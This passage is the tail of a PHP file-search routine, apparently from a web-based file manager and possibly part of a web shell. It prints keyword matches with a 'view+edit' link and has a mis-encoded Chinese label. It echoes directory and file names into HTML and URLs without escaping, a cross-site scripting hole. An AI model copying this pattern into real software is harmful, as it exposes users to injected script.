	$mymsg = explode("\n",$msg);
	$long = count($mymsg);
	$tmp = explode($oldkey,$msg);
	$tmp = explode("\n",$tmp[0]);
	$first = count($tmp);
	$end = "[".$first."/".$long."]";
}
if($type2=="getpath"){
	$get = explode($oldkey,$msg);
	$get = strlen($get[0]);
	if(isset($beline)){
	$get = $get-$beline;
	}
	$getpath = htmlspecialchars(substr($msg, $get, $endline)); 
	$getpath = "title = \"".$getpath."\"";
}
echo "<span class=\"redfont\" $getpath>�ҵ�:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
}
                              } 
                         }                    
} 
?>